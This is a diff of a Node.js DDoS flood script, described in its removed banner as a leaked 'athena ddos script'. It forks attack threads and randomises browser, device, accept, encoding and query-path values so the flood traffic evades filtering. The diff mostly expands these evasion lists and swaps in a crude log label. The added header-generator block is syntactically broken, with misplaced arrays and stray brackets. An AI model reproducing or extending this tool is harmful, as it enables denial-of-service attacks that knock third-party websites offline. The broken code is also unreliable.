@@ -46,16 +46,16 @@
   Promise.race([axiosPromise, timeoutPromise])
     .then((response) => {
       const { status, data } = response;
-      console.log(`[\x1b[35mTLS-SUPERV2\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+      console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
     })
     .catch((error) => {
       if (error.message === 'Request timed out') {
-        console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} Request Timed Out`);
+        console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} Request Timed Out`);
       } else if (error.response) {
         const extractedTitle = getTitleFromHTML(error.response.data);
-        console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+        console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
       } else {
-        console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} ${error.message}`);
+        console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} ${error.message}`);
       }
     });
 }
@@ -106,49 +106,81 @@
 if (cluster.isMaster){
   console.clear();
   console.log(`
- █     █░ ██▀███   ██▓ ▄▄▄        ██████ ▓█████ 
-▓█░ █ ░█░▓██ ▒ ██▒▓██▒▒████▄    ▒██    ▒ ▓█   ▀ 
-▒█░ █ ░█ ▓██ ░▄█ ▒▒██▒▒██  ▀█▄  ░ ▓██▄   ▒███   
-░█░ █ ░█ ▒██▀▀█▄  ░██░░██▄▄▄▄██   ▒   ██▒▒▓█  ▄ 
-░░██▒██▓ ░██▓ ▒██▒░██░ ▓█   ▓██▒▒██████▒▒░▒████▒
-░ ▓░▒ ▒  ░ ▒▓ ░▒▓░░▓   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░░ ▒░ ░
-  ▒ ░ ░    ░▒ ░ ▒░ ▒ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ░ ░  ░
-  ░   ░    ░░   ░  ▒ ░  ░   ▒   ░  ░  ░     ░   
-    ░       ░      ░        ░  ░      ░     ░  ░
-                                                  leaked athena ddos script by Weird1337 t.me/ddospw      
+
+ $$$$$$\    $$\     $$\                         $$\       
+$$  __$$\   $$ |    $$ |                        $$ |      
+$$ /  $$ |$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$$\ $$ |  $$\ 
+$$$$$$$$ |\_$$  _|\_$$  _|   \____$$\ $$  _____|$$ | $$  |
+$$  __$$ |  $$ |    $$ |     $$$$$$$ |$$ /      $$$$$$  / 
+$$ |  $$ |  $$ |$$\ $$ |$$\ $$  __$$ |$$ |      $$  _$$<  
+$$ |  $$ |  \$$$$  |\$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ 
+\__|  \__|   \____/  \____/  \_______| \_______|\__|  \__|
+                                                          
+                                                         
 `);
   
   for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
-    console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
+    console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
   }
-  console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
+  console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
   setInterval(getStatus, 2000);
   setTimeout(() => {
-    console.log(`[\x1b[35mTLS-WRIASE\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+    console.log(`[\x1b[35mTLS SEX\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
     process.exit(1);
   }, process.argv[3] * 1000);
 } 
 
 let headerGenerator = new HeaderGenerator({
     browsers: [
-        { name: "firefox", minVersion: 112, httpVersion: "2" },
-        { name: "opera", minVersion: 112, httpVersion: "2" },
-        { name: "edge", minVersion: 112, httpVersion: "2" },
-        { name: "chrome", minVersion: 112, httpVersion: "2" },
-        { name: "safari", minVersion: 16, httpVersion: "2" },
+  { name: "firefox", minVersion: 112, httpVersion: "2" },
+  { name: "opera", minVersion: 112, httpVersion: "2" },
+  { name: "edge", minVersion: 112, httpVersion: "2" },
+  { name: "chrome", minVersion: 112, httpVersion: "2" },
+  { name: "safari", minVersion: 16, httpVersion: "2" },
+  { name: "brave", minVersion: 112, httpVersion: "2" },
+  { name: "vivaldi", minVersion: 112, httpVersion: "2" },
+  { name: "yandex", minVersion: 112, httpVersion: "2" },
+  { name: "maxthon", minVersion: 112, httpVersion: "2" },
+  { name: "palemoon", minVersion: 112, httpVersion: "2" },
+  { name: "ucbrowser", minVersion: 112, httpVersion: "2" },
+  { name: "dolphin", minVersion: 112, httpVersion: "2" },
+  { name: "midori", minVersion: 112, httpVersion: "2" },
+  { name: "epiphany", minVersion: 112, httpVersion: "2" },
+  { name: "waterfox", minVersion: 112, httpVersion: "2" },
+  { name: "seamonkey", minVersion: 112, httpVersion: "2" },
+  { name: "otter", minVersion: 112, httpVersion: "2" },
+  { name: "slimjet", minVersion: 112, httpVersion: "2" },
+  { name: "cyberfox", minVersion: 112, httpVersion: "2" },
+  { name: "puffin", minVersion: 112, httpVersion: "2" },
+];
+
+   devices: [  
+    "mobile",     
+    "smartphone",
+    "tablet",
+    "smartwatch",     
+    "fitness-tracker",
+    "ebook",
+];
     ],
-    devices: [
-        "desktop",
-        "mobile",
-    ],
-    operatingSystems: [
-        "windows",
-        "linux",
-        "macos",
-        "android",
-        "ios",
-    ],
+operatingSystems: [
+  "windows",
+  "linux",
+  "macos",
+  "android",
+  "ios",
+  "chrome-os",
+  "fire-os",
+  "tizen",
+  "watchos",
+  "kaios",
+  "freebsd",
+  "symbian",
+  "blackberry-os",
+  "webos",
+  "ubuntu-touch",
+],
     locales: ["en-US", "en"]
 });
 let randomHeaders = headerGenerator.getHeaders()
@@ -279,16 +311,67 @@ accept_header = [
   'application/json, text/plain, */*',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+  'application/xml',
+  'application/xhtml+xml',
+  'text/plain',
+  'text/xml',
+  'text/plain;q=0.5',
+  'text/plain;q=0.5, application/xml;q=0.9',
+  'application/xml;q=0.1',
+  'application/json;q=0.5',
+  'application/json;q=0.5, text/plain;q=0.2',
+  'application/xml;q=0.2, application/json;q=0.8',
+  'application/xml;q=0.9, application/json;q=0.5',
+  'application/json;q=0.5, application/xml;q=0.2',
+  'text/html;q=0.7, application/xml;q=0.2',
+  'text/plain;q=0.1, application/json;q=0.9',
+  'text/plain;q=0.5, text/html;q=0.5, application/json;q=0.5',
+  'text/html;q=0.9, text/plain;q=0.5, application/json;q=0.5',
+  'text/plain;q=0.5, text/html;q=0.5, application/json;q=0.5, application/xml;q=0.5',
+  'text/html;q=0.5, application/json;q=0.5, text/plain;q=0.5, application/xml;q=0.5',
+  'text/plain;q=0.5, application/json;q=0.5, text/html;q=0.5, application/xml;q=0.5',
+  'text/html;q=0.5, text/plain;q=0.5, application/xml;q=0.5, application/json;q=0.5',
+  'text/plain;q=0.5, application/json;q=0.5, text/html;q=0.5, application/xml;q=0.5',
+  'text/html;q=0.5, application/json;q=0.5, text/plain;q=0.5, application/xml;q=0.5',
+  'text/plain;q=0.5, application/json;q=0.5, text/html;q=0.5, application/xml;q=0.5',
+  'text/html;q=0.5, text/plain;q=0.5, application/xml;q=0.5, application/json;q=0.5',
+  'text/plain;q=0.5, application/json;q=0.5, text/html;q=0.5, application/xml;q=0.5',
+  'text/html;q=0.5, application/json;q=0.5, text/plain;q=0.5, application/xml;q=0.5',
 ],
 
 encoding_header = [
-  'gzip, deflate, br',
-  'compress, gzip',
-  'deflate, gzip',
-  'gzip, identity',
-  '*'
-],
+    'gzip',
+    'deflate',
+    'compress',
+    'br',
+    'gzip, deflate',
+    'gzip, compress',
+    'gzip, br',
+    'deflate, compress',
+    'deflate, br',
+    'compress, br',
+    'gzip, deflate, compress',
+    'gzip, deflate, br',
+    'gzip, compress, br',
+    'deflate, compress, br',
+    'gzip, deflate, compress, br',
+    'identity',
+    'gzip, identity',
+    'deflate, identity',
+    'compress, identity',
+    'br, identity',
+    'gzip, deflate, identity',
+    'gzip, compress, identity',
+    'gzip, br, identity',
+    'deflate, compress, identity',
+    'deflate, br, identity',
+    'compress, br, identity',
+    'gzip, deflate, compress, identity',
+    'gzip, deflate, br, identity',
+    'gzip, compress, br, identity',
+    'deflate, compress, br, identity'
+]
 
 controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
 
@@ -385,8 +468,11 @@ const Methods = [
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 
 const queryStrings = [
-  "&", 
-  "=", 
+  "&", 
+  "=",
+  "?",
+  "#",
+  "%",
 ];
 
 const pathts = [
@@ -402,6 +488,114 @@ const pathts = [
   "?limit=10",
   "?start_date=1989-06-04",
   "?end_date=1989-06-04",
+  "?tag=javascript",
+  "?tag=programming",
+  "?tag=web-development",
+  "?tag=science",
+  "?tag=history",
+  "?tag=travel",
+  "?tag=food",
+  "?tag=health",
+  "?tag=fashion",
+  "?tag=art",
+  "?tag=music",
+  "?tag=photography",
+  "?tag=business",
+  "?tag=finance",
+  "?tag=education",
+  "?tag=fitness",
+  "?tag=gaming",
+  "?tag=books",
+  "?tag=movies",
+  "?tag=tv-shows",
+  "?tag=architecture",
+  "?tag=design",
+  "?tag=space",
+  "?tag=nature",
+  "?tag=philosophy",
+  "?tag=psychology",
+  "?tag=mathematics",
+  "?tag=language",
+  "?tag=animals",
+  "?tag=technology-news",
+  "?tag=world-news",
+  "?tag=health-news",
+  "?tag=science-news",
+  "?tag=entertainment-news",
+  "?tag=sports-news",
+  "?tag=travel-news",
+  "?tag=environment",
+  "?tag=politics",
+  "?tag=celebrities",
+  "?tag=pop-culture",
+  "?tag=diy",
+  "?tag=cooking",
+  "?tag=parenting",
+  "?tag=pets",
+  "?tag=gardening",
+  "?tag=home-decor",
+  "?tag=crafts",
+  "?tag=beauty",
+  "?tag=technology-tips",
+  "?tag=programming-tips",
+  "?tag=career-advice",
+  "?tag=productivity",
+  "?tag=life-hacks",
+  "?tag=inspiration",
+  "?tag=motivation",
+  "?tag=success",
+  "?tag=positivity",
+  "?tag=relationships",
+  "?tag=self-improvement",
+  "?tag=leadership",
+  "?tag=innovation",
+  "?tag=creativity",
+  "?tag=humor",
+  "?tag=quotes",
+  "?tag=history-facts",
+  "?tag=space-facts",
+  "?tag=science-facts",
+  "?tag=technology-facts",
+  "?tag=language-facts",
+  "?tag=travel-facts",
+  "?tag=art-facts",
+  "?tag=music-facts",
+  "?tag=book-reviews",
+  "?tag=movie-reviews",
+  "?tag=game-reviews",
+  "?tag=restaurant-reviews",
+  "?tag=travel-reviews",
+  "?tag=gadget-reviews",
+  "?tag=product-reviews",
+  "?tag=event-reviews",
+  "?tag=concert-reviews",
+  "?tag=sport-reviews",
+  "?tag=health-tips",
+  "?tag=fitness-tips",
+  "?tag=nutrition-tips",
+  "?tag=mental-health",
+  "?tag=travel-tips",
+  "?tag=study-tips",
+  "?tag=career-tips",
+  "?tag=technology-trends",
+  "?tag=industry-trends",
+  "?tag=fashion-trends",
+  "?tag=home-trends",
+  "?tag=art-trends",
+  "?tag=food-trends",
+  "?tag=travel-trends",
+  "?tag=science-trends",
+  "?tag=technology-events",
+  "?tag=art-events",
+  "?tag=music-events",
+  "?tag=sports-events",
+  "?tag=technology-conferences",
+  "?tag=art-exhibitions",
+  "?tag=music-festivals",
+  "?tag=food-festivals",
+  "?tag=book-fairs",
+  "?tag=health-events",
+  "?tag=science-conventions",
 ];
 
 const refers = [
